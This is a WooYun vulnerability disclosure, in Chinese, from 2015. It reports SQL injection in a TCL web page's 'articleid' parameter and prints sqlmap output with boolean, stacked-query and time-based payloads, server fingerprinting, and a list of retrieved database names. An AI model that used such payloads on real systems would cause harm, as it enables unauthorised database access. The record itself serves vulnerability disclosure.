wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-08-24：	细节已通知厂商并且等待厂商处理中									2015-08-29：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： TCL某站存在SQL注入 详细说明：  问题处：http://www.tclcomm.cn/news_content.asp?articleid=2114GET下参数articleid存在注入   漏洞证明：  
Place: GETParameter: articleid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: articleid=2114 AND 5150=5150    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: articleid=2114; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: articleid=2114 WAITFOR DELAY '0:0:5'-----[15:44:45] [INFO] testing Microsoft SQL Server[15:44:46] [INFO] confirming Microsoft SQL Server[15:44:47] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[15:44:47] [INFO] fetching database names[15:44:47] [INFO] fetching number of databases[15:44:47] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[15:44:47] [INFO] retrieved: 7[15:44:48] [INFO] retrieved: master[15:45:01] [INFO] retrieved: model[15:45:12] [INFO] retrieved: msdb[15:45:25] [INFO] retrieved: ReportServer[15:45:51] [INFO] retrieved: ReportServerTempDB[15:46:28] [INFO] retrieved: tempdb[15:46:42] [INFO] retrieved: webavailable databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] web
   修复方案：  RT   版权声明：转载请注明来源 Nday Plus@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-29 17:42 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
